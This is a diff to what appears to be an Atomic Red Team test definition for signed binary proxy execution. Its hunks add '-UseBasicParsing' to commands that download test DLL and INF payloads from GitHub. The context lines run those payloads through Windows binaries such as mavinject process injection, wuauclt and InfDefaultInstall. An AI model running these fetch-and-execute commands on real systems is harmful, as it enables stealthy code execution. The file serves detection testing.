@@ -24,7 +24,7 @@ atomic_tests:
       if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/x64/T1218.dll" -OutFile "#{dll_payload}" -UseBasicParsing
   executor:
     command: |
       mavinject.exe #{process_id} /INJECTRUNNING "#{dll_payload}"
@@ -49,7 +49,7 @@ atomic_tests:
       if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}" -UseBasicParsing
   executor:
     command: |
       C:\Windows\SysWow64\Register-CimProvider.exe -Path "#{dll_payload}"
@@ -75,7 +75,7 @@ atomic_tests:
       if (Test-Path "#{inf_to_execute}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{inf_to_execute}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}" -UseBasicParsing
   executor:
     command: |
       InfDefaultInstall.exe "#{inf_to_execute}"
@@ -233,7 +233,7 @@ atomic_tests:
       if (Test-Path "#{txt_payload}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{txt_payload}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt" -OutFile "#{txt_payload}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt" -OutFile "#{txt_payload}" -UseBasicParsing
   - description: DiskShadow.exe must exist on disk at specified location (#{dspath})
     prereq_command: |
       if (Test-Path #{dspath}) {exit 0} else {exit 1}
@@ -264,7 +264,7 @@ atomic_tests:
       if (test-path "#{arbitrary_dll}"){exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{arbitrary_dll}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true" -OutFile "#{arbitrary_dll}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/bin/calc.dll?raw=true" -OutFile "#{arbitrary_dll}" -UseBasicParsing
   executor:
     command: |
       wuauclt.exe /UpdateDeploymentProvider "#{arbitrary_dll}" /RunHandlerComServer
@@ -321,7 +321,7 @@ atomic_tests:
       if (Test-Path "#{Path_inf}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{Path_inf}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf" -OutFile "#{Path_inf}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf" -OutFile "#{Path_inf}" -UseBasicParsing
   executor:
     command: |
       copy #{Path_ie4uinit} %TEMP%\ie4uinit.exe
